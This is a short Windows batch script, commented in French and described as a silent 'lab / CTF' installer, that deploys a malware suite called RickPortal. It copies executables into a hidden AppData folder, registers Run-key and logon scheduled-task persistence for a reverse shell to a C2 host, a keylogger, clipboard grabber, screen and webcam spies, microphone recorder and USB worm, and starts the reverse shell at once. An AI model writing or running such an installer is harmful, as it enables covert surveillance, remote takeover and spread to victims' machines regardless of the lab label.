@echo off
REM RickPortal Windows - install silencieuse (lab / CTF autorise)
REM Cle/registre + taches planifiees : persistance user-level, pas d'admin requis
set C2=__C2__
set PORT=__PORT__
set D=%APPDATA%\RickPortal

mkdir "%D%" 2>nul
copy /y "%~dp0win\*.exe" "%D%\" >nul

REM shell + clipboard au login (Run key)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RickShell /t REG_SZ /d "\"%D%\02_reverse_shell.exe\" %C2% %PORT%" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RickClip /t REG_SZ /d "\"%D%\04_clipboard.exe\"" /f >nul

REM le reste en taches planifiees
schtasks /create /f /tn RickKey    /tr "\"%D%\01_keylogger.exe\""           /sc onlogon >nul 2>&1
schtasks /create /f /tn RickScreen /tr "\"%D%\07_screenspy.exe\" 30"        /sc onlogon >nul 2>&1
schtasks /create /f /tn RickCam    /tr "\"%D%\08_webcam.exe\" 15"           /sc onlogon >nul 2>&1
schtasks /create /f /tn RickMic    /tr "\"%D%\10_mic_rec.exe\""             /sc onlogon >nul 2>&1
schtasks /create /f /tn RickUsb    /tr "\"%D%\05_usb_worm.exe\""            /sc onlogon >nul 2>&1

REM exec immediate du shell vers le C2
start "" "%D%\02_reverse_shell.exe" %C2% %PORT%

REM dossier cache
attrib +h "%D%" >nul 2>&1
exit
